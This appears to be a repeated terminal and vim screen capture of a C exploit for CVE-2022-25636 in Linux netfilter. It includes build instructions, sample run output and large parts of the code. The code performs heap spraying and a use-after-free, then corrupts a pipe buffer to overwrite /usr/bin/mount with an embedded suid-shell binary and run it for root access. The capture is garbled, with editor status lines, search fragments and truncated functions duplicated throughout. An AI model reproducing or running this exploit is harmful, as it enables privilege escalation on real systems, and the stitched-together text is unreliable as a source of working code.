 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 *
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
"exploit.c" [noeol][dos] 799L, 27245B                                                                                                                1,1           Top
#include <err.h>
#include <fcntl.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#define NUM_MSQIDS (0x800)
#define HOLE_STEP (0x100)
#define MSG_TEXT_SIZE(x) (         \
    (x) - sizeof(struct msg_msg) - \
    sizeof(struct msg_msgseg) * (((x + PAGE_SIZE - 1) / PAGE_SIZE) - 1))
#define MSG_A_TEXT_SIZE MSG_TEXT_SIZE(0x1080)
#define MSG_B_TEXT_SIZE MSG_TEXT_SIZE(0x1400)
#define MTYPE_A (0x41)
#define MSG_SIG (0x13371337)
#define NUM_SOCKETS (4)
#define NUM_SKBUFFS (0x20)
#define SIZE_OF_SKB_SHARED_INFO (0x140)
#define NUM_PIPES (0x100)

#define FLOW_ACTION_REDIRECT (0x5)
#define PIPE_BUF_FLAG_CAN_MERGE (0x10)

#define ATTACK_FILE "/usr/bin/mount"

const char attack_data[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
                                                                                                                                                     122,0-1       10%
    }
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
            usleep(10);
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);
        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
            execl(ATTACK_FILE, ATTACK_FILE, NULL);
/fo
/**
 * CVE-2022-25636 exploit
 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 *
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
/fork
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
            usleep(10);
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);
        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
            execl(ATTACK_FILE, ATTACK_FILE, NULL);
/fo
/**
 * CVE-2022-25636 exploit
 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 *
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
/fok
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
            usleep(10);
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);
        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
            execl(ATTACK_FILE, ATTACK_FILE, NULL);
/fo
/**
 * CVE-2022-25636 exploit
 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 *
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
/fork
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
            usleep(10);
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
            usleep(10);
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);

        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
/lea
/**
 * CVE-2022-25636 exploit
 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 *
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
/leakd
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
            usleep(10);
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
            usleep(10);
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);

        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
/leak
/**
 * CVE-2022-25636 exploit
 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 *
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
/leak-
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
            usleep(10);
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
        }
        while (corrupted_sec_msqid2 < 0) {
            corrupted_sec_msqid2 = do_msg_corruption();
            usleep(10);
        }
        do_uaf(corrupted_sec_msqid1, corrupted_sec_msqid2);

        write(sync_pipe[1], "T", 1);

        while (1) {
            sleep(10);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
/leak
/**
 * CVE-2022-25636 exploit
 *
 * This exploit use pipe-primitive so no kaslr leak nor smap
 *  smep ktpi bypass is needed.
 *
 * Compile with:
 *  gcc exp.c -o exp -static -no-pie -Iinclude -Llib -lnftnl -lmnl -s
 *
 * This exploit will overwrite /usr/bin/mount with suid-shell and
 *  execute it. Backup it manually before running exploit, and
 *  restore it quickly after exploit success.
 *
 * user@ubuntu:~$ ./exp
 * [+] STEP 0: do init
 * [*] init unshare ...
 * [*] bind cpu ...
 * [*] init msq ...
 * [*] init sock ...
 * [+] STEP 1: leak heap address
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] searching for corrupted msg_msg ...
 * [+] found corrupted msg_msg
 * [+] get heap leak: 0xffff9913f8a13000
 * [+] STEP 2: do uaf
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2046].security
 * [*] spray msg_msg ...
 * [*] create holes, step: 256 ...
 * [*] triggering oob write ...
 * [*] wish we overwrite msg.security to dev
 * [+] yes, we overwrite msg[2047].security
 * [*] free corrupted msg1 to let dev uaf ...
 * [*] spray 4k skbuff data ...
 * [*] free corrupted msg2 to let skbuff uaf ...
 * [*] spray 4k msg_msg and 1k msg_msgseg ...
 * [*] free skbuff to leak msg_b->next (1k) ...
 * [+] find leak! msg[7]->next: 0xffff9913b49d9000
 * [*] edit msg_b's security and m_ts ...
 * [*] ptr->next: 0xffff9913b49d8ff8
 * [*] spray 4k skbuff data ...
 * [*] check leaked msg ...
/leak_
    mnl_attr_put_u32(nlh, NFTA_CHAIN_FLAGS, htonl(2));
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                     NFT_MSG_NEWRULE, NFPROTO_NETDEV,
                                     NLM_F_CREATE | NLM_F_APPEND, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
        die("mnl_socket_open");
    }

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        die("mnl_socket_send");
    }
}

uint64_t leak_dev_addr() {
    logd("spray msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        usleep(10);
    logd("searching for corrupted msg_msg ...");
    uint64_t dev_addr = 0;
            logi("get heap leak: 0x%lx", leak_pos[0]);

    return dev_addr;
}

int do_we_overwrite_security_ptr() {
    for (int i = 0; i < NUM_MSQIDS; i++) {
        usleep(10);
        if (msgrcv(msqid[i], msg, MSG_A_TEXT_SIZE, 0, MSG_COPY | IPC_NOWAIT) > 0) {
            if (msg->mtype == FLOW_ACTION_REDIRECT) {
                return i;
            }
        }
    }

    return -1;
}

int do_msg_corruption() {
    logd("spray msg_msg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        usleep(10);
        msg->mtype = MTYPE_A;
        memset(msg->mtext, 'A', MSG_A_TEXT_SIZE);
        ((int *)msg->mtext)[0] = MSG_SIG;
        ((int *)msg->mtext)[1] = i;
        if (msgsnd(msqid[i], msg, MSG_A_TEXT_SIZE, 0) < 0) {
            die("msgsnd");
        }
    }

    logd("create holes, step: %d ...", HOLE_STEP);
    for (int i = 0; i < NUM_MSQIDS; i += HOLE_STEP) {
        usleep(10);
        if (msgrcv(msqid[i], msg, MSG_A_TEXT_SIZE, MTYPE_A, 0) < 0) {
            die("msgrcv");
        }
    }

    logd("triggering oob write ...");
    logd("wish we overwrite msg.security to dev");
    int corrupted_sec_idx = -1;
    for (int k = 0; k < 3; k++) {
        usleep(10);
        trigger_oob_write(50, 2); // in slab-4k (0x1000)
        corrupted_sec_idx = do_we_overwrite_security_ptr();
        if (corrupted_sec_idx >= 0) {
            logi("yes, we overwrite msg[%d].security", corrupted_sec_idx);
            break;
/for

    // clean
    clean_msg();
    return corrupted_msqid;
}

int do_uaf(int corrupted_sec_msqid1, int corrupted_sec_msqid2) {
    logd("free corrupted msg1 to let dev uaf ...");
    if (msgrcv(corrupted_sec_msqid1, msg, MSG_A_TEXT_SIZE, FLOW_ACTION_REDIRECT, IPC_NOWAIT) < 0) {
        die("free corrupted msg1 failed");
    }

    logd("spray 4k skbuff data ...");
    char tmp_buff[PAGE_SIZE] = {0};
    memset(tmp_buff, 'X', sizeof(tmp_buff));
    spray_skbuff_data(tmp_buff, sizeof(tmp_buff) - SIZE_OF_SKB_SHARED_INFO);

    logd("free corrupted msg2 to let skbuff uaf ...");
    if (msgrcv(corrupted_sec_msqid2, msg, MSG_A_TEXT_SIZE, FLOW_ACTION_REDIRECT, IPC_NOWAIT) < 0) {
        die("free corrupted msg2 failed");
    }

    logd("spray 4k msg_msg and 1k msg_msgseg ...");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        usleep(10);
        msg->mtype = MTYPE_A;
        memset(msg->mtext, 0, MSG_B_TEXT_SIZE);
        ((int *)msg->mtext)[0] = MSG_SIG;
        ((int *)msg->mtext)[1] = i;
        ((int *)(msg->mtext + (0x1000 - 0x30)))[0] = MSG_SIG;
        ((int *)(msg->mtext + (0x1000 - 0x30)))[1] = i;
        if (msgsnd(msqid[i], msg, MSG_B_TEXT_SIZE, 0) < 0) {
            die("msgsnd");
        }
    }

    logd("free skbuff to leak msg_b->next (1k) ...");
    uint64_t msg_next_1k = 0;
    int leak_msg_idx = -1;
    char bak_msg_b[0x1000];
    for (int i = 0; i < NUM_SOCKETS; i++) {
        usleep(10);
        for (int j = 0; j < NUM_SKBUFFS; j++) {
        usleep(10);
            if (read(sock_pairs[i][1], tmp_buff, 0x1000 - SIZE_OF_SKB_SHARED_INFO) < 0) {
                die("read from sock pairs failed");
            }
            if (!msg_next_1k) {
                struct msg_msg *ptr = (struct msg_msg *)tmp_buff;
/for

    logd("edit msg_b's security and m_ts ...");

    uint64_t page_idx = 0;
    uint64_t bak_msg_next = 0;
    {
        struct msg_msg *ptr = (struct msg_msg *)bak_msg_b;
        bak_msg_next = ptr->next;
        ptr->m_ts += 0xc00;
    lbl1:
        ptr->next = (bak_msg_next & (~0xfff)) - 8 + page_idx * PAGE_SIZE;
        logd("ptr->next: 0x%08lx", ptr->next);
    }

    logd("spray 4k skbuff data ...");
    spray_skbuff_data(bak_msg_b, 0x1000 - SIZE_OF_SKB_SHARED_INFO);

    logd("check leaked msg ...");
    int adjacent_msg_idx = -1;
    int adjacent_msg_offset = 0;
    if (msgrcv(msqid[leak_msg_idx], msg, MSG_B_TEXT_SIZE + 0xc00, 0, IPC_NOWAIT | MSG_COPY) < 0) {
        die("recv leaked msg data failed");
    }
    for (int i = 0; i < 4; i++) {
        usleep(10);
        uint32_t *ptr = (uint32_t *)(msg->mtext + (0x1000 - 0x30) + (0x400 * i));
        hexdump(ptr, 0x40);
        if (ptr[2] == MSG_SIG && ptr[3] != leak_msg_idx) {
            adjacent_msg_idx = ptr[3];
            adjacent_msg_offset = 0x400 * i;
            logd("nice! adjacent chunk is also msg_msgseg, index: %d", adjacent_msg_idx);
            break;
        } else {
            loge("adjacent chunk %d not msg_msgseg", i);
        }
    }
    if (adjacent_msg_idx < 0) {
        loge("bad luck, adjacent chunk is not msg_msgseg");
        free_skbuff_data(tmp_buff, 0x1000 - SIZE_OF_SKB_SHARED_INFO);
        loge("searching in next page ...");
        page_idx++;
        goto lbl1;
    }

    logd("free adjacent msg_msg ...");
    if (msgrcv(msqid[adjacent_msg_idx], msg, MSG_B_TEXT_SIZE, 0, IPC_NOWAIT) < 0) {
        die("msgrcv");
/for
            logd("nice! adjacent chunk is obtained bt pipe_buffer, index: %d", uaf_pipe_idx);
        } else {
            die("bad luck, adjacent chunk is not pipe_buffer");
        }
    }

    logd("recover edited msg_msg's m_ts and next");
    logd("edit security ptr to pipe_buffer, prepare to free");
    free_skbuff_data(tmp_buff, 0x1000 - SIZE_OF_SKB_SHARED_INFO);
    {
        struct msg_msg *ptr = (struct msg_msg *)bak_msg_b;
        ptr->m_ts -= 0xc00;
        ptr->next = bak_msg_next;
        ptr->security = (ptr->next & (~0xfff)) + page_idx * PAGE_SIZE + adjacent_msg_offset;
    }
    spray_skbuff_data(bak_msg_b, 0x1000 - SIZE_OF_SKB_SHARED_INFO);

    logd("free edited msg_msg ...");
    if (msgrcv(msqid[leak_msg_idx], msg, MSG_B_TEXT_SIZE, 0, IPC_NOWAIT) < 0) {
        die("msgrcv");
    }

    logd("keep skbuff not uaf");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        usleep(10);
        memset(msg->mtext, 0, MSG_TEXT_SIZE(0x1000));
        msg->mtype = MTYPE_A;
        if (msgsnd(msqid[i], msg, MSG_TEXT_SIZE(0x1000), 0) < 0) {
            die("msgsnd");
        }
    }

    logd("edit pipe buffer ...");
    {
        uint64_t *ptr = (uint64_t *)bak_pipe_buffer;
        ptr[6] = 0;                       // offset | len
        ptr[8] = PIPE_BUF_FLAG_CAN_MERGE; // flag
    }
    spray_skbuff_data(bak_pipe_buffer, 0x400 - SIZE_OF_SKB_SHARED_INFO);

    logd("try to overwrite %s", ATTACK_FILE);
    {
        ssize_t nbytes = write(pipes[uaf_pipe_idx][1], attack_data, sizeof(attack_data));
        if (nbytes < 0) {
            perror("write failed");
            die();
        }
/for

-rw-rw-r-- 1 cve cve    247 12ì›”  7 14:49 README.md
cve@cve:~/CVE-2022-25636-PipeVersion$ ./poc
[+] STEP 0: do init
[*] init unshare ...
[*] bind cpu ...
[*] init msq ...

    logd("see if %s changed", ATTACK_FILE);
    {
        int fd = open(ATTACK_FILE, O_RDONLY);
        if (fd < 0) {
            die("open attack file");
        }
        char tmp_buffer[0x10];
        read(fd, tmp_buffer, 0x10);
        uint32_t *ptr = (uint32_t *)(tmp_buffer + 9);
        if (ptr[0] != 0x56565656) {
            hexdump(tmp_buffer, 0x10);
            die("overwrite attack file failed: 0x%08x", ptr[0]);
        }
    }
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
            usleep(10);
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
"exploit.c" [dos] 816L, 27533B                                                                                                                       771,10        97%

    logd("see if %s changed", ATTACK_FILE);
    {
        int fd = open(ATTACK_FILE, O_RDONLY);
        if (fd < 0) {
            die("open attack file");
        }
        char tmp_buffer[0x10];
        read(fd, tmp_buffer, 0x10);
        uint32_t *ptr = (uint32_t *)(tmp_buffer + 9);
        if (ptr[0] != 0x56565656) {
            hexdump(tmp_buffer, 0x10);
            die("overwrite attack file failed: 0x%08x", ptr[0]);
        }
    }
    logi("exploit success");
    return 0;
}

int main(int argc, char **argv) {
    pipe(sync_pipe);


    if (!fork()) {
        logi("STEP 0: do init");
        logd("init unshare ...");
        init_unshare();
        logd("bind cpu ...");
        bind_cpu();
        logd("init msq ...");
        init_msq();
        logd("init sock ...");
        init_sock();

        logi("STEP 1: leak heap address");
        uint64_t dev_addr = 0;
        while (!dev_addr) {
            dev_addr = leak_dev_addr();
            usleep(10);
        }

        logi("STEP 2: do uaf");
        int corrupted_sec_msqid1 = -1;
        int corrupted_sec_msqid2 = -1;
        while (corrupted_sec_msqid1 < 0) {
            corrupted_sec_msqid1 = do_msg_corruption();
            usleep(10);
"exploit.c" [dos] 816L, 27533B                                                                                                                       771,10        97%
